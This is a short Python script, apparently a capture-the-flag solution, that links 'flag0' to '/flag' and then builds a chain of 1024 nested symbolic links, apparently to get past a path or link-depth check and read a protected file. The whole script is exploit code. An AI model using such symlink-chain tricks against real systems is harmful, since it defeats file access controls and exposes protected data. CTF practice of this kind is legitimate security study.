import subprocess

subprocess.run(['ln', '-s', "/flag", "flag0"])

for i in range(1024):
  subprocess.run(['ln', '-s', "flag{}".format(i), "flag{}".format(i+1)])
